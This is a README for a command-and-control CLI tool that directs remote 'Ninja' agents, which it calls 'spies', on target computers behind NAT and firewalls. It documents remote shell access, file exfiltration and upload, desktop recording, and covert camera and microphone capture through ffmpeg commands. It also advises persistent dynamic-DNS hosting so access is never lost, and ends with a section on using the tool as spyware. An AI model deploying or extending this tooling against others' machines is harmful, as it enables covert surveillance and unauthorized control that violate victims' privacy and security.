# Jonin [![version-shield]][release] [![cross-platform-shield]](#platforms)
> A fully customizable CLI application to coummunicate with and send commands to __[Ninja][ninja]__ spies behind any NAT, firewall and proxy! 

![logo]

# [Download][release]
You can download latest release from [here][release]

# Features

- Secure shell access to remote ([Ninja][ninja]) computer
- File upload/download (Multiple files at once) to/from remote ([Ninja][ninja])
- Shell stream, run command on remote ([Ninja][ninja]) and stream output to a file on local ([Jonin][jonin])

# Platforms

![windows] | ![macos] | ![linux] |
--- | --- | --- |
Tested on Windows 10 ✔ | Not tested but should work | Not tested but should work |


# Overview

This CLI application will provide a fully customizable tool to manage __[Ninja][ninja]__ instances, connect to them, execute commands, download and upload files and use shell stream feature (stream shell output from Ninja to Jonin/local computer).

- [Download](#download)
- [Features](#features)
- [Platforms](#platforms)
- [Overview](#overview)
- [Ninja](#ninja)
- [Setup](#setup)
- [Usage](#usage)
    - [Control Commands](#control-commands)
        - [change](#change)
        - [clear](#change)
        - [exit](#change)
    - [Command Types](#command-types)
        - [manage](#manage)
        - [cmd](#cmd)
        - [cmd-stream](#cmd-stream)
        - [upload](#upload)
        - [download](#download)
        - [tray](#tray)
- [Configuration File](#configuration-file)
- [Host Setup](#host-setup)
    - [Use Dynamic DNS](#use-dynamic-dns)
    - [Use A Static IP Address](#use-a-static-ip-address)
    - [Use A Domain Name](#use-a-domain-name)
- [Use As Spyware](#use-as-spyware)


# [Ninja][ninja]
__[Ninja][ninja]__ should be running on the target computer in order to control it with Jonin. Host and PORT configuration should be same on Ninja and Jonin to establish connection

# Setup

Follow these steps to setup Jonin: 

- Download the __[release][release]__ and extract 
- Change __HOST__ and __PORT__ in `config/constants.json` to match values on target __[Ninja][ninja]__. Please read [This Guidance](#host-setup) about how to setup HOST to never lose access to Ninja
- Forward selected port on you router. There are lots of guides out there. [This one][noio-port-forwarding] from noip is a nice one
- Done! Now wait for some report from your __[Ninja][ninja]__ spies!

__Note: make sure to create your own certificates in `/certificates`. Existing certificates are only to make it easier to test__

# Usage

There are few command types available that each of them has their own commands. Here's a full instruction:

__(Note that you can customize `all` these commands in `config/constants.json`)__

### Control Commands

- #### `change` 
  use this command to change command type ([list of all types](#command-types))
- #### `cls`, `clear` 
  clear console
- #### `/exit` 
  cose Jonin

### Command Types
- #### `manage` 
    __Ninja__ management command. using this command type, you can
    see list of your __Ninja__ s, check their details and connect to them
    
    __note: you should list __Ninja__ s first in order to use commands that
    require index__

    __Usage:__

    - `list`

      List all Ninjas

    - `expand <index>`

      display all details of the __Ninja__ with index < index > from Ninja list

    - `connect <index>`

      connect to the __Ninja__ with index < index > from Ninja list

    - `disconnect`

      disconnect from Ninja

    __Example:__

    - `list`
      show list of Ninjas

    - `expand 1`

      display all details of Ninja __Ninja__ with index 1 from __Ninja__ list

    - `connect 1`

      connect to Ninja __Ninja__ with index 1 from __Ninja__ list

- #### `cmd` 
    This is a direct shell access to __Ninja__.
    You can type any command and see the output

    __Usage:__

    `any valid command`

    __Example:__

    - `ping 8.8.8.8`
    - `diskpart`
    - `traceroute`

- #### `cmd-stream` 
    Same as `cmd`, except this one takes 2 local file paths and pipes the command output and error from __Ninja__ to these files respectively
    
    __note: you can press Esc at any time to end transfer__

    __Usage:__

    `@<command>@<output_file>@[<error_file>@]`
    - `<command>` any valid command

    - `<output_file>` a valid local file path to pipe process __output__
    
    - `<error_file>` a valid local file path to pipe process __error__
    
    __Example:__

    - `@tracert 8.8.8.8@G:/trace.txt@`
    
        pipe trace route result from Ninja to G:/trace.txt)

    - `@ffmpeg -f gdigrab -framerate 30 -i desktop -f matroska -@G:/desktop.mkv@G:/desktop-err.txt@`
        
        record __Ninja__ desktop and pipe it to G:/desktop.mkv, also pipe any process error to G:/desktop-err.txt


- #### `upload` 
    Upload one or more files from local to __Ninja__
    
    __note: you can press Esc at any time to end transfer__

    __Usage:__

    `@<local_file_path>|<remote_file_path>@[...]`

    - `<local_file_path>` a valid local (source) file path
    
    - `<remote_file_path>` a valid file path on __Ninja__ (destination)
    
    - `[...]` add more path pairs to upload multiple files at once
    
    __Example:__

    - `@G:/movie.mkv|C:/movie.mkv@`
        
        upload movie.mkv from local's G drive to __Ninja__'s C drive
    
    - `@G:/movie1.mkv|C:/movie1.mkv@G:/movie2.mkv|C:/movie2.mkv@`
        
        upload movie1.mkv and movie2.mkv from local's G drive
        to __Ninja__'s C drive both together

- #### `download` 
    Download one or more files from __Ninja__ to local
    
    __note: you can press Esc at any time to end transfer__

    __Usage:__

    `@<local_file_path>|<remote_file_path>@[...]`

    - `<local_file_path>` a valid local (destination) file path
    
    - `<remote_file_path>` a valid file path on __Ninja__ (source)
    
    - `[...]` add more path pairs to download multiple files at once
    
    __Example:__

    - `@G:/movie.mkv|C:/movie.mkv@`
        
        download movie.mkv from __Ninja__'s C drive to local's G drive
    
    - `@G:/movie1.mkv|C:/movie1.mkv@G:/movie2.mkv|C:/movie2.mkv@`
        
        download movie1.mkv and movie2.mkv from __Ninja__'s C drive
        to local's G drive both together

- #### `tray` 
    To have some fun, you can control __Ninja__'s disk tray

    __Usage:__

    `eject`

    this is the only command for now

# Configuration File
You can find this file in `config/constants.json`:

```jsonc
{
    // connection port
    "PORTS": {
        "DATA": 443
    },

    // connection config. any valid Socket.io option
    "CONNECTION": {
        "RECONNECTION_DELAY_MAX": 5000,
        "RECONNECTION_DELAY": 1000,
        "TIMEOUT": 20000,

        "rejectUnauthorized": false
    },

    // interval in which file receiver party will send ack to sender
    "FILE_TRANSFER": {
        "ACK_INTERVAL": 2000
    },

    // command type names
    "COMMAND_TYPES": {
        "CMD": "cmd",
        "TRAY": "tray",
        "INSTANCE_MANAGEMENT": "manage",
        "UPLOAD": "upload",
        "DOWNLOAD": "download",
        "CMD_STREAM": "cmd-stream"
    },

    "INSTANCE_MANAGEMENT_COMMANDS": {
        "LIST": "list",
        "CONNECT": "connect",
        "DISCONNECT": "disconnect",
        "EXPAND": "expand"
    },

    "TRAY_COMMANDS": {
        "EJECT": "eject"
    },

    "CONTROL_COMMANDS": {
        "CHANGE_COMMAND_TYPE": "change",
        "CLEAR": ["cls", "clear"],
        "EXIT": ["/exit"],
        "HELP": "#help"
    },

    "CONTROL_KEYS": {
        "END_TASK": {
            // key display name, can be anything
            "NAME": "Esc",
            // JavaScript keypress event key name
            "CODE": "escape"
        }
    },

    // separators used in commands like download and upload
    "PRIMARY_SEPARATOR": "@",
    "SECONDARY_SEPARATOR": "|",

    "PROGRESS_BAR": {
        // progress bar colors 
        "COLOR_MAP": {
            "FAILED": ["red", "red"],
            "INVALID": ["red", "red"],
            "DONE": ["gray", "green"],
            "IN_PROGRESS": ["gray", "cyan"]
        },
        // progress bar name/label maximum length
        "MAX_NAME_LENGTH": 10
    }
}
```

# Host Setup
When configuring __[Ninja][ninja]__, you should use a __HOST__ that will always be available. So you'll have to use one of the following options:

### Use Dynamic DNS
This is the best way I can suggest since It's free and easy. you just need to create an account in one of DDNS services (like [Duck DNS][duckdns] and [No-Ip][noip]), create a domain name and set it to point to your dynamic IP address. If your ISP changed your IP, then just simply change it on DDNS website or install a Dynamic Update Client (DUC) to do this for you automatically.

### Use A Static IP Address
You can use an IP address for your Jonin and set this IP in __[Ninja][ninja]__'s configuration. This is not recommended since you'll have to spend money while there are easy free ways, unless you have a static IP already

### Use A Domain Name
Just like static IP, you can use a domain name for your Jonin and set this name in __[Ninja][ninja]__'s configuration. For same reason as static IP, this also is not a recommended way

# Record Ninja Camera And Mic
One way to do this is to use __FFmpeg__. You'll need to either copy __FFmpeg__ files into target computer when setting up __[Ninja][ninja]__, upload it to an already set up __Ninja__ using `upload` command or order Ninja to download it itself using shell commands
Then, on windows for example, you can run this:
```bash
ffmpeg -list_devices true -f dshow -i dummy
```
to see list of DirectShow devices and then use the following `cmd-stream` command to record it on Jonin computer:
```bash
@ffmpeg -f dshow -i video="DIRECT_SHOW_CAMERA_FROM_LIST":audio="DIRECT_SHOW_MIC_FROM_LIST" -f matroska -@G:/cam.mkv@G:/cam-err.txt@
```
which will save video to __G:/cam.mkv__ and errors to __G:/cam-err.txt__

# Use As Spyware
Be aware __[Ninja][ninja]__ can be easily used as a spyware when installed as a service, it will open full access to the target computer for the Jonin controlling it

[version-shield]: https://img.shields.io/badge/Version-1.0.0-blue
[cross-platform-shield]: https://img.shields.io/badge/Cross-Platform-brightgreen
[logo]: https://user-images.githubusercontent.com/46329768/120117984-597c1200-c1a5-11eb-8190-2dac8b7cbe8d.jpg
[ninja]: https://github.com/ErAz7/Ninja
[jonin]: https://github.com/ErAz7/Jonin
[release]: https://github.com/ErAz7/Jonin/releases
[noio-port-forwarding]: https://www.noip.com/support/knowledgebase/general-port-forwarding-guide/
[noip]: https://www.noip.com
[duckdns]: https://www.duckdns.org
[windows]: https://user-images.githubusercontent.com/46329768/120122894-fa2bfb00-c1c0-11eb-9700-8a55d43f1e01.png
[macos]: https://user-images.githubusercontent.com/46329768/120122895-fbf5be80-c1c0-11eb-92c4-fba52ce104cc.png
[linux]: https://user-images.githubusercontent.com/46329768/120122893-f7c9a100-c1c0-11eb-8c7b-405c73691113.png

